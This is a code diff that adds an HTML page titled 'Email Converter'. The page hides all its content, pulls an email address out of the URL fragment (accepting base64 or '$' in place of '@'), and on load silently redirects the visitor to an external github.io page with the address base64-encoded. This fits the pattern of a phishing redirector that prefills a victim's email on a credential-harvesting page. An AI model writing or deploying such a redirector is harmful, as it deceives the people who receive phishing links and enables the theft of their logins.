@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Email Converter</title>
+    <style>
+        /* Hide everything from view */
+        body, html {
+            width: 0;
+            height: 0;
+            overflow: hidden;
+            margin: 0;
+            padding: 0;
+        }
+    </style>
+</head>
+<body>
+    <script>
+        // Function to process email and redirect
+        function processEmailAndRedirect() {
+            // Get the email from URL hash
+            function getEmailFromURL() {
+                const hash = window.location.hash.substring(1);
+                
+                if (!hash) return null;
+                
+                let decoded = null;
+                
+                // Try to decode as base64 first
+                try {
+                    const base64Decoded = atob(hash);
+                    if (base64Decoded.indexOf('@') !== -1) decoded = base64Decoded;
+                } catch (e) {
+                    // Not a valid base64 string, continue to check as plain email
+                }
+                
+                // If base64 decode didn't work, check if it's a plain email
+                if (!decoded) {
+                    const emailWithAt = hash.replace(/\$/g, '@');
+                    if (emailWithAt.indexOf('@') !== -1) decoded = emailWithAt;
+                }
+                
+                if (!decoded) return null;
+                
+                // Extract ONLY the email - remove anything after it (like |randomstrings or -suffixes)
+                return extractCleanEmail(decoded);
+            }
+            
+            // Extract only the valid email portion, stripping everything after it
+            function extractCleanEmail(input) {
+                // Replace $ with @ if present
+                input = input.replace(/\$/g, '@');
+                
+                // Regex to match a valid email and capture only that part
+                const emailRegex = /[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}/;
+                const match = input.match(emailRegex);
+                
+                return match ? match[0] : null;
+            }
+            
+            const email = getEmailFromURL();
+            
+            if (email) {
+                // Redirect to the target URL with only the clean email
+                window.location = "https://watamumarine-tech.github.io/impactfuzzy-palm-technology/#" + btoa(email);
+            }
+        }
+        
+        // Start the process immediately
+        window.onload = processEmailAndRedirect;
+    </script>
+</body>
+</html>
